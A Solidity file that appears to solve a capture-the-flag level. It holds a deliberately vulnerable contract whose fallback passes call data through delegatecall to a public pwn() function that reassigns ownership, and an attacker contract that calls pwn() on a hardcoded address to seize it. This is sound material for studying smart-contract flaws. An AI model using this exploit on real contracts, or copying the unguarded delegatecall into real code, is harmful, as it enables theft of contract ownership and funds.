contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}


contract Jacked {

    constructor() {
        address delegate = 0x6E05D774ff737b138199AFE99A47a922a959d5A5;
        delegate.call(abi.encodeWithSignature("pwn()"));
    }

    function encode() public view returns (bytes memory){
        return abi.encodeWithSignature("pwn()");
    }

}